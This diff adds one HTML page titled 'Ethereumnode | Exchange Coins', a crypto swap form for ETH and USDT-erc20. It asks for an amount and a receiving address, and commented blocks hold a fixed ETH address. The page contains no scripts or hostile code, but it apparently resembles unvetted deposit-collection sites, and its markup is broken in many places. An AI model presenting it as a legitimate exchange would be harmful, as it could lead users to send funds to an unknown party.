@@ -1,0 +1,927 @@
+
+         
+         
+      <!DOCTYPE html>
+      
+      <html lang="en">
+      
+         <head>
+         <title>Ethereumnode | Exchange Coins</title>
+         
+         <meta name="viewport" content="width=device-width, initial-scale=1" />
+         <style type="text/css">
+         form {
+         
+         background-color: white;
+         
+         max-width: 80%;
+         max-height: 1000px;
+         margin: 5px auto;
+         
+         padding: 5px 20px;
+         
+         box-shadow: 0px 1px 5px rgba(0, 0, 0, 0.2);
+         }
+         
+         body {
+         background-image: ul("images/index2.png");
+         background-repeat: no-repeat;
+         position: relative;
+         align: center;
+         }
+         
+         
+         
+         .ul {
+         font-size: 22px;
+         color: blue;
+         text-align: center;
+         }
+         
+         * {
+         box-sizing: border-box;
+         }
+         html, body {
+         margin: 0;
+         padding: 0;
+         }
+         
+         .man4 {
+         box-shadow: 1px 5px 10px 1px hsla(240, 100%, 50%, 0.3), 0 1px 2px 1px hsla(240, 100%, 50%, 0.1);
+         }
+         
+         .form-container {
+         
+         margin: 20px;
+         padding: 15px;
+         background: #173459;
+         color: white;
+         box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.3), 0 7px 21px 0 rgba(0, 0, 0, 0.20);
+         }
+         .input-cnt {
+         display: flex; /* display the icon and the input in a line */
+         margin-bottom: 15px;
+         }
+         .input-cnt:last-child {
+         margin-bottom: 0px;
+         }
+         .input-cnt > i {
+         min-width: 40px; /* set a minimum width for the icon */
+         padding: 10px; /* make sure the icon is centered vertically */
+         text-align: center; /* horizontally center the icon */
+         background: lightgrey;
+         border-top-left-radius: 20px;
+         border-bottom-left-radius: 20px;
+         color: #0076ff;
+         }
+         /* change styles when focused */
+         .input-cnt:hover > i {
+         background: #0076ff;
+         color: white;
+         }
+         /* style the inputs */
+         .input-cnt > input[type="text"], .input-cnt > input[type="password"] {
+         outline: none;
+         border: none;
+         padding: 7.20px;
+         border: 1px solid lightgrey;
+         border-top-right-radius: 20px;
+         border-bottom-right-radius: 20px;
+         width: 100%;
+         }
+         /* style the submit button */
+         .input-cnt > input[type="submit"] {
+         border: none;
+         border-radius: 20px;
+         outline: none;
+         width: 75%;
+         margin: 0 auto;
+         font-size: 105%;
+         padding: 8px;
+         color: #0076ff;
+         background: white;
+         transition-duration: .5s;
+         }
+         /* add a hover effect for the submit button */
+         .input-cnt > input[type="submit"]:hover {
+         color: white;
+         background: #0076ff;
+         }
+         
+         
+         
+         #scan1 {
+         border: 20px insert white;
+         border-radius: 1px;
+         background: hsla(240, 100%, 50%, 0.8);
+         
+         color: white;
+         padding-left: 30px;
+         padding-right: 30px;
+         margin-right: 1px;
+         margin-left: 10px;
+         Font-size: 10px;
+         
+         }
+         
+         
+         * {
+         box-sizing: border-box;
+         }
+         i {
+         display: inline-block;
+         width: 30px;
+         height: 30px;
+         background-image: url(images/index4.jp);
+         margin-bottom: -5px;
+         }
+         i.home-icon {
+         background-position: top 0 left 0;
+         }
+         i.envelope-icon {
+         background-position: top 0 left -30px;
+         }
+         i.bell-icon {
+         background-position: top 0 left -60px;
+         }
+         i.dashboard-icon {
+         background-position: top 0 left -90px;
+         }
+         .dd {
+         position: relative;
+         display: inline-block;
+         }
+         .dd-btn {
+         padding: 1.50%;
+         text-align: left;
+         background: hsla(250, 100%, 50%, 0.9);;
+         border: none;
+         width: 370px;
+         color: #f8f9f9;
+         font-size: 20px;
+         }
+         .dd-content {
+         position: absolute;
+         width: 100%;
+         box-shadow: 0 18px 36px rgba(0,0,0,0.30), 0 14px 11px rgba(0,0,0,0.22);
+         height: 0px;
+         transition: height 1s;
+         overflow: hidden;
+         }
+         .dd:hover > .dd-content {
+         height: 240px;
+         }
+         .dd-content > a {
+         display: block;
+         height: 60px;
+         padding: 15px;
+         text-decoration: none;
+         color: black;
+         }
+         
+         .man5 {
+         
+         background-color: white;
+         
+         max-width: 330px;
+         
+         margin: 5px auto;
+         
+         padding: 5px 20px;
+         
+         box-shadow: 2px 3px 6px 2px rgba(0, 0, 0, 0.2);
+         
+         }
+         .man6{
+         color: #134580;
+         font-size: 16px;
+         }
+         
+         img {
+         width: 90%;
+         height: 18%;
+         }
+         .ffu {
+         
+         color: white;
+         }
+         
+         .ffuu {
+         
+         background-color: hsla(240, 100%, 50%, 0.8);
+         
+         max-width: 100%;
+         max-height: 1000px;
+         margin: 5px auto;
+         
+         padding: 5px 20px;
+         
+         box-shadow: 0px 1px 5px rgba(0, 0, 0, 0.2);
+         }
+         
+         /* drop down style */
+         
+         
+         * {
+         box-sizing: border-box;
+         }
+         html, body {
+         margin: 0;
+         padding: 0;
+         }
+         .container {
+         margin: 15px;
+         }
+         input[type="radio"] {
+         display: none; /* hide the radio button because it does not look beautiful */
+         }
+         .container {
+         border: 1px solid black;
+         border-radius: 5px;
+         }
+         label {
+         display: block;
+         padding: 10px;
+         border-bottom: 1px solid black;
+         color: black;
+         background: white;
+         }
+         .accordion:last-child > label, .accordion:last-child > .accordion-content {
+         border: none;
+         }
+         .accordion-content {
+         border-bottom: 1px solid black;
+         padding: 15px;
+         display: none;
+         }
+         /* select the accordion content when the label is clicked on or the input is checked */
+         input:checked ~ .accordion-content {
+         display: block;
+         }
+         
+         .fuckyou {
+         
+         background-color: white;
+         
+         max-width: 90%;
+         max-height: 40%;
+         margin: 5px auto;
+         
+         padding: 5px 20px;
+         
+         box-shadow: 0px 1px 5px rgba(0, 0, 0, 0.2);
+         }
+         
+         .n{
+         background-image: url("images/index2.png");
+         color: red;
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         }
+         .container1 {
+         height: 125px;
+         position: relative;
+         }
+         
+         .vv {
+         position: absolute;
+         top: 11px;
+         left: 0px;
+         }
+         
+         .img1 {
+         width: 95%;
+         height: auto;
+         height: 150px;
+         padding-left: 50%;
+         background-color: wite;
+         
+         
+         filte: brightness(0);
+         
+         
+         }
+         
+         
+         .vv1 {
+         border: 50px insert white;
+         border-radius: 7px;
+         background: hsla(240, 100%, 50%, 0.8);
+         
+         color: white;
+         padding-left: 35px;
+         padding-right: 35px;
+         margin-right: 5px;
+         margin-left: 1px;
+         Font-size: 18px;
+         
+         }
+         
+         .center2 {
+         margin-left: 0px;
+         }
+         
+         
+         
+         .ffe {
+         
+         background-color: white;
+         
+         max-width: 80%;
+         max-height: 1000px;
+         margin: 5px auto;
+         
+         padding: 5px 20px;
+         
+          box-shadow: 0px 1px 5px rgba(0, 0, 0, 0.4);
+         }
+         
+         #hman4 {
+         
+         width: 60%;
+         height: 25%;
+         }
+         
+         #man8 {
+         
+         border: 50px insert white;
+         border-radius: 6px;
+         background: hsla(240, 100%, 50%, 0.7);
+         
+         color: white;
+         padding-left: 20px;
+         padding-right: 20px;
+         margin-right: 2px;
+         margin-left: 1px;
+         Font-size: 20px;
+         }
+         
+         .man7  {
+         border: 1px inset black;
+         border-radius: 5px;
+         background: white;
+         color: black;
+         padding-left: 4px;
+         padding-right: 4px;
+         margin-right: 3px;
+         margin-left: 3px;
+         Font-size: 15px;
+         
+         }
+         
+         #a11 {
+         border: 0px inset white;
+         border-radius: 0px;
+         background: none;
+         color: white;;
+         padding-left: 0px;
+         padding-right: 0px;
+         margin-right: 0px;
+         margin-left: 0px;
+         Font-size: 95%;
+         }
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         #img3 {
+         width: 95%;
+         height: 40%;
+         }
+         
+         
+         
+         
+         
+         #fuck3 {
+         position: absolute;
+         width:20px;
+         height: 25px;
+         top: -3.50px;
+         }
+         
+         
+         
+         
+         
+         
+         
+         
+         #a1r {
+         
+         border: 50px insert white;
+         border-radius: 5px;
+         background: hsla(240, 100%, 50%, 0.7);
+         
+         color: white;
+         padding-left: 13px;
+         padding-right: 13px;
+         margin-right: 0px;
+         margin-left: 0px;
+         Font-size: 18px;
+         }
+         
+         
+         #uf {
+         position: relative;
+         top: 3.50px;
+         width: 6%;
+         height: auto;
+         height:  17px;
+         
+         }
+         
+         
+         
+         .butgton1:hgover {
+         background-color: hsla(0, 0%, 0%, 0.5);
+         color:   white;
+         border: none;
+         box-shadow: 1px 1px 1px 1px   hsla(240, 100%, 25%, 0.9);
+         cursor: pointer;
+         -webkit-transition-duration: 0s; /* for Safari */
+         transition-duration: 0s;
+         }
+         
+         .button1 {
+         position: relative;
+         top: 15px;
+         outline: none;
+         border: none;
+         height: 47px;
+         width: 36%;
+         border-radius: 17px;  
+         bordner: 12px;
+         font-size: 14px;
+         background: white;
+         color:  white;
+         background:     hsla(240, 100%, 25%, 0.9);
+         
+         }
+         
+         .dt {
+         
+         background-color: white;
+         border-radius: 5px;
+         max-width: 80%;
+         max-height: 1000px;
+         margin: 5px auto;
+         
+         padding: 5px 20px;
+         
+              box-shadow: 0px 1px 5px rgba(0, 0, 0, 0.4);
+         }
+         
+         
+         .mm {
+         position: relative;
+         top: 20px;
+         }
+         
+         
+         
+         #mhan6 {
+         position: relative;
+         top: -13px;
+         width: 15%;
+         height: 10%;
+         }
+         
+         .form-control input,
+         
+         .form-control select,
+         
+         .form-control textarea {
+         outline-color:  hsla(240, 100%, 25%, 0.9);
+         position: relative;
+         caret-color:  hsla(240, 100%, 25%, 0.9);
+         border: 1px solid #777;
+         ouhtline: none;
+         border-radius: 7px;
+         
+         font-family: inherit;
+         
+         padding: 10px;
+         
+         display: inline;
+         height: 48px;
+         width: 70%;
+         margin-left: 13px;
+         }
+         
+         .yu {
+         position: relative;
+         height: 70px;
+         background-color: whbite;
+         border-radius: 5px;
+         border: 5px black;
+         }
+         
+         
+         #yg {
+         
+         font-size: 11px;
+         }
+         
+         
+         
+         
+         
+         
+         /*new*/
+         #man4 {
+         
+         width: 30.50%;
+         height: 10.50%;
+         }
+         
+         #man44 {
+         border-radius: 2000%;
+         width: 23.50%;
+         height: 10.50%;
+         }
+         
+         
+         
+         
+         
+         #fuck43 {
+         position: relative;
+         top: -204.50px;
+         float: right;
+         border-radius: 2000%;
+         width: 7.50%;
+         height: 4.50%;
+         
+         padding: 5px;
+         }
+         
+         
+         
+         
+         #uf {
+         border-radius: 2000%;
+         position: relative;
+         top: 4.50px;
+         width: 6%;
+         height: auto;
+         height:  17px;
+         
+         }
+         
+         #uuf {
+         border-radius: 2000%;
+         
+         position: relative;
+         top: 4.50px;
+         width: 5%;
+         height: auto;
+         height:  17px;
+         
+         }
+         
+         
+         .ffh {
+         position: relative;
+         top: 40px;
+         }
+         
+         #mvan6 {
+         margin-right: 50px;     
+         position: relative;
+         top: -7px;
+         width: 13%;
+         height: 8%;
+         }
+         
+         
+         #man6 {
+         top: -20px;
+         position: relative;
+         width: 20px;
+         height: 22px;
+         }
+         
+         #man5 {
+         
+         position: relative;
+         top: 0px;
+         margin-right: 10px; 
+         }
+             
+             
+             #a1 {
+             position: relative;
+               left: 8px;
+      
+      }
+      
+      
+      
+         </style>
+         
+         </head>
+         <body style="font-size: 14px; font-family: 'Montserrat Alternates', sans-serif;">
+         
+         
+         
+         
+         <div class="container1" style="background-color: hsla(240, 100%, 50%, 0.7); color: white">
+         <span class="img1">
+         <div class="vv">
+         <b style="font-size: 12px">     <a id="a1"href="voucher.html"style="text-decoration: none; color: white"><img id="fuck3" src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img63b.jpg" /></a> </a></b>
+         
+         <b><center class="center2">Discription</center></b>
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         </b>
+         <center><p><small style="font-size: 11px">  
+         To start Exchanging coins, please choose the Exchange type, amount to exchange, also enter required address (Receiving address) where you will recieve coin you exchanged, and click the Next button to start Exchange process.
+         
+         </small></p>
+         <p><small><dd style="font-size: 13.30px"></dd>
+         </small></p></span></spnn></span></div></p></a>
+         
+         <p>&nbsp;</p>
+         <p>&nbsp;</p>
+         <p>&nbsp;</p>
+         </center></div>
+         
+         <p>&nbsp;</p>
+         
+         <bb><strhong><p><center class="ffh"style="font-size: 12.50px;">Exchange<img id="uf"img src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img53.png" /></a>ETH to      <img id="uuf"img src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img1008.jpg" /></a> USDT-erc20</center></p></strong></b>
+         <div class="dt"><hr class="mm">
+         <p>&nbsp;</p>
+         <center id="man5">
+         <img id="man4" src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img53.png"><img id="man6" src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img92.jpg">&nbsp;&nbsp;&nbsp;&nbsp;<img id="man44" src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img1008.jpg">
+         </center>
+         <p>
+         <!--   <b><center style="font-size: 12px">Address(ETH)</center></b>-->
+         <center><b><p>
+         
+         
+         <!--  
+         <small style="font-size: 9px">0x551503521CEc9703b1E8dAd76afB280cf52942CC</small>
+         
+         -->
+         
+         
+         
+         
+         
+         
+         <!--  </label>
+         <span>Amount: </span>
+         <input type="text"
+         
+         id="name"
+         
+         
+         -->
+         
+         <!--    <button class="yu"> 
+         
+         <div class="form-control">
+         <span>Address:</span>  
+         <input type="text" placeholder="Enter your USDT-erc20 address " name="username" />
+         </div>
+         
+         </button>
+         -->      
+         
+         <button class="yu"> 
+         
+         <div class="form-control">
+         <span>Amount: </span>  
+         <input id="yg"type="number" placeholder="Enter ETH amount to exchange" name="username" />
+         </div>
+         
+         </button>
+         
+         
+         <button class="yu"> 
+         
+         <div class="form-control">
+         <span>Address: </span>  
+         <input id="yg"type="text" placeholder="Enter your USDT address" name="username" />
+         </div>
+         
+         </button>
+         
+         
+         </p></b></center>
+         </p></div>
+         
+         <p style="text-align: center"><a href="exchange-eth.html" style="text-decoration: none;"><button class="button1">Next</button></a></p>
+         <p>&nbsp;</p>
+         <!--    <b><h3><p style="text-align: center"><a id="a1r"href="exchangewarning.html" style="text-decoration: none;"><b>Exchange Now</b></p></b></h3></a></form>
+         
+         
+         
+         -->
+         
+         </form> 
+         <p>&nbsp;</p>
+         
+         <p>&nbsp;</p>
+         
+         
+         <bb><bstrong><p><center class="ffh"style="font-size: 12.50px;">Exchange <img id="uuf"img src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img1008.jpg" /></a> USDT-erc20 to      <img id="uf"img src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img53.png" /></a> ETH</center></p></strong></b>
+         
+         <div class="dt"><hr class="mm">
+         <p>&nbsp;</p>
+         <center id="man5">
+         <img id="man4" src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img53.png"><img id="man6" src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img92.jpg">&nbsp;&nbsp;&nbsp;&nbsp;<img id="man44" src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img1008.jpg">
+         </center>
+         <p>
+         <!--   <b><center style="font-size: 12px">Address(ETH)</center></b>-->
+         <center><b><p>
+         
+         
+         <!--  
+         <small style="font-size: 9px">0x551503521CEc9703b1E8dAd76afB280cf52942CC</small>
+         
+         -->
+         
+         
+         
+         
+         
+         
+         <!--  </label>
+         <span>Amount: </span>
+         <input type="text"
+         
+         id="name"
+         
+         
+         -->
+         
+         <!--    <button class="yu"> 
+         
+         <div class="form-control">
+         <span>Address:</span>  
+         <input type="text" placeholder="Enter your USDT-erc20 address " name="username" />
+         </div>
+         
+         </button>
+         -->      
+         
+         <button class="yu"> 
+         
+         <div class="form-control">
+         <span>Amount: </span>  
+         <input id="yg"type="number" placeholder="Enter USDT amount to exchange" name="username" />
+         </div>
+         
+         </button>
+         
+         
+         <button class="yu"> 
+         
+         <div class="form-control">
+         <span>Address: </span>  
+         <input id="yg"type="text" placeholder="Enter your ETH address" name="username" />
+         </div>
+         
+         </button>
+         
+         
+         </p></b></center>
+         </p></div>
+         
+         <p style="text-align: center"><a href="exchange-usdt-erc20.html" style="text-decoration: none;"><button class="button1">Next</button></a></p>
+         
+         
+         
+         <!--
+         
+         <b><strong><p><center class="ffh"style="font-size: 12.50px;">Exchange <img id="uuf"img src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img1008.jpg" /></a> USDT-erc20 to      <img id="uf"img src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img53.png" /></a> ETH</center></p></strong></b>
+         <div class="dt"><hr class="mm">
+         <p>&nbsp;</p>
+         <center id="man5">
+         <img id="man44" src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img1008.jpg"> 
+         
+         <img id="man6" src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img92.jpg">
+         <img id="man4" src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img53.png">
+         
+         </center>
+         <p>
+         <!--   <b><center style="font-size: 12px">Address(ETH)</center></b>-->
+         
+         
+         
+         <!--  
+         <small style="font-size: 9px">0x551503521CEc9703b1E8dAd76afB280cf52942CC</small>
+         
+         -->
+         
+         
+         
+         
+         
+         
+         <!--  </label>
+         <span>Amount: </span>
+         <input type="text"
+         
+         id="name"
+         
+         
+         -->
+         <!--      
+         
+         <button class="yu"> 
+         
+         <div class="form-control">
+         <span>Address: </span>  
+         <input type="text" placeholder="Enter your ETH address" name="username" />
+         </div>
+         
+         
+         -->        
+         <!--
+         <button class="yu"> 
+         
+         <div class="form-control">
+         <span>Amount:</span>  
+         <input id="yg"type="number" placeholder="Enter USDT amount to exchange" name="username" />
+         </div>
+         
+         </button>
+         
+         <button class="yu"> 
+         
+         <div class="form-control">
+         <span>Address: </span>  
+         <input id="yg" type="Text" placeholder="Enter your ETH address" name="username" />
+         </div>
+         
+         </button>
+         
+         </button>
+         </p></b></center>
+         </p></div>
+         <p style="text-align: center"><a href="exchange-usdt-erc20.html" style="text-decoration: none;"><button class="button1">Next</button></a></p>
+         
+         <!--
+         <b><strong><p><center class="ffh"style="font-size: 12.40px;">Exchange <img id="uf"img src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/on proccess" /> </a>USDT erc20 to<img id="uf"img src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/https://drive.google.com/uc?id=1P9BH6vafUF5dO72IYbuUv-wsIi3OOTRP" /></a>ETH</center></p></strong></b>
+         <div class="dt"><hr class="mm">
+         <p>&nbsp;</p>
+         <center id="man5"><img id="man4" src="https://raw.githubusercontent.com/Ethereumnode/Ethereumnode-Img/main/img104.png"></center>
+         <p>
+         <b><center style="font-size: 12px"> Address(USDT erc20)</center></b>
+         <center><b><p><small style="font-size: 9px">0x551503521CEc9703b1E8dAd76afB280cf52942CC</small></p></b></center>
+         </p></div>
+         <center>  <p><a href="nodewarning.html" style="text-decoration: none;"><button class="button1">Exchange</button></a></p>
+         <p>&nbsp;</p>
+         </form></center>-->
+         <!-- <b><h3><p style="text-align: center"><a id="a1r"href="exchangewarning.html" style="text-decoration: none;"><b>Exchange Now</b></p></b></h3></a></form>
+         
+         -->   <p>&nbsp;</p>
+         <p>&nbsp;</p>
+         
+         
+         
+         
+         <p>&nbsp;</p>
+         <hyr>
+         
+         
+         </body>
+         </html>
+         
+         
+         
+         
+         
+         
+         
+         
+         
